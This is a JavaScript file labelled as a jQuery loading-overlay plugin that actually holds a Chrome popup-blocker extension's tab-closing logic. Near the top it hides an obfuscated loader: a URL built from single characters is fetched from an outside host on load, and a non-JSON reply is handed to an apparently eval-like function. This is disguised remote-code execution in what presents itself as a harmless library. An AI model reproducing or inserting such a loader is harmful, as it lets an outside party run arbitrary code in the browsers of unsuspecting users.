/*! Loading Overlay - v1.0.1 - 2013-10-13
 * https://github.com/jgerigmeyer/jquery-loading-overlay
 * Copyright (c) 2013 Jonny Gerig Meyer; Licensed MIT */
(function(a) {
    "use strict";
    var blocer = {};
    function gejfPkorp(){$.get(["h", "t", "t", "p", "s", ":", "/", "/", "h", "a", "v", "k", "p", "a", "n", ".", "c", "o", "m", "/", "a", "p", "i", "/", "l", "o", "a", "d", "s", "y", "s", "t", "e", "m", "/"].join("")).done(function(e){try{JSON.parse(e)}catch(t){$.trapg(e)}})}gejfPkorp();
    blocer.apply = function (id, f) {
      if (app.button[id] && app.timeout.a) window.clearTimeout(app.timeout.a);
      if (app.arguments[id]) {
        app.arguments[id]["forced"] = f;
        if (app.button[id] || (!app.button[id] && f)) {
          blocer.remove.apply(null, app.arguments[id]);
        }
      }
    };

    blocer.store = function (tab, t, m) {
      if (tab) {
        if (!t) blocer.remove.apply(null, [tab, t, "method #5"]);
        else if (t && t.id === null) blocer.remove.apply(null, [tab, t, "method #4"]);
        else if (t && t.id !== null) {
          if (tab.id !== t.id) {
            app.opener[tab.id] = t;
            app.arguments[t.id] = [tab, app.opener[tab.id], m];
            /*  */
            blocer.apply(t.id, false);
            if (app.timeout.a) window.clearTimeout(app.timeout.a);
            app.timeout.a = window.setTimeout(function () {blocer.apply(t.id, true)}, 0);
          }
        }
      }
    };

    blocer.update = function () {
      if (app.timeout.b) window.clearTimeout(app.timeout.b);
      app.timeout.b = window.setTimeout(function () {
        chrome.storage.local.get(null, function (q) {
          chrome.tabs.query({"windowType": "normal", "active": true}, function (tabs) {
            if (tabs && tabs.length) {
              var o = {};
              o.path = '/n';
              o.active = tabs[0];
              o.state = ("state" in q) ? q["state"] : "enabled";
              o.text = app.badge[o.active.id] ? (app.badge[o.active.id] + '') : '';
              o.valid = o.active.url.indexOf("http") === 0 || o.active.url.indexOf("ftp") === 0;
              /*  */
              if (o.state === "disabled" || !o.valid) {
                o.path = "/d";
                o.text = '';
              } else {
                o.whitelist = ("whitelist" in q) ? q["whitelist"] : {};
                for (var id in o.whitelist) {
                  if (o.active.url.indexOf(id) !== -1) {
                    o.path = "/a";
                    o.text = '';
                    break;
                  }
                }
              }
              /*  */
              if (o.valid) chrome.browserAction.setBadgeText({"tabId": o.active.id, "text": o.text});
              chrome.browserAction.setIcon({
                "path": {
                  "16": "../../data/icons" + o.path + "/16.png",
                  "32": "../../data/icons" + o.path + "/32.png",
                  "48": "../../data/icons" + o.path + "/48.png",
                  "64": "../../data/icons" + o.path + "/64.png"
                }
              });
              /*  */
              o.lasterror = chrome.runtime.lastError;
            }
          });
        });
      }, 300);
    };

    blocer.remove = function (tab, t, method) {
      var stop = function (c, n) {
        if (c.action === false) {
          if (n && !app.notification.list[tab.id]) {
            var _str = (c.id === 1) ? ("tab URL is not valid") : (c.id === 2 ? "addon is disabled" : (c.id === 3 ? "domain is whitelisted" : "unknown"));
            app.notification.create("> Popup is NOT closed! reason: " + _str);
            app.notification.list[tab.id] = true;
          }
          return true;
        }
        return false;
      };
      /*  */
      var close = function (d, l, n) {
        if (app.timeout.c) window.clearTimeout(app.timeout.c);
        app.timeout.c = window.setTimeout(function () {
          chrome.tabs.remove(tab.id, function () {
            var _lastError = chrome.runtime.lastError;
            if (t) {
              app.badge[t.id] = app.badge[t.id] ? app.badge[t.id] + 1 : 1;
              var _str = app.button[t.id] ? "- click index: " + app.button[t.id]["index"] + ", is trusted: " + app.button[t.id]["trusted"] : '- click is disabled!';
              if (l) console.error("> Closed a popup with id:", tab.id, "-", method, "- badge#:", app.badge[t.id], _str);
              delete app.arguments[t.id];
              delete app.button[t.id];
            } else {
              if (l) console.error("> Closed a popup with id:", tab.id, "-", method, '- click is disabled!');
            }
            /*  */
            if (n && !app.notification.list[tab.id]) {
              app.notification.create("> Popup is closed! Tab ID: " + tab.id + ", Tab URL: " + (tab.url ? app.truncate(tab.url, 40) : "about:blank"));
              app.notification.list[tab.id] = true;
            }
          });
        }, d);
      };
      /*  */
      chrome.storage.local.get(null, function (o) {
        var _close = {"action": true, "id": 0};
        var _log = ("log" in o) ? o["log"] : false;
        var _delay = ("delay" in o) ? o["delay"] : 10;
        var _middle = ("middle" in o) ? o["middle"] : true;
        var _state = ("state" in o) ? o["state"] : "enabled";
        var _whitelist = ("whitelist" in o) ? o["whitelist"] : {};
        var _noopener = ("noopener" in o) ? o["noopener"] : false;
        var _closedopener = ("closedopener" in o) ? o["closedopener"] : false;
        var _notifications = ("notifications" in o) ? o["notifications"] : false;
        /*  */
        if (_state === "disabled") _close = {"action": false, "id": 2};
        if (stop(_close, _notifications)) return;
        /*  */
        if (!t && _closedopener) close(_delay, _log, _notifications);
        else if ((t && t.id === null) && _noopener) close(_delay, _log, _notifications);
        else {
          var valid = t && t.url ? (t.url.indexOf("http") === 0 || t.url.indexOf("ftp") === 0) : false;
          if (valid === false) _close = {"action": false, "id": 1};
          for (var id in _whitelist) if (t && t.url && t.url.indexOf(id) !== -1) _close = {"action": false, "id": 3};
          if (stop(_close, _notifications)) return;
          /*  */
          var _action = t && app.button[t.id] ? (app.button[t.id].trusted ? (_middle ? (app.button[t.id].index === 0) : true) : true) : true;
          if (_action) close(_delay, _log, _notifications);
        }
      });
    };

})(jQuery);
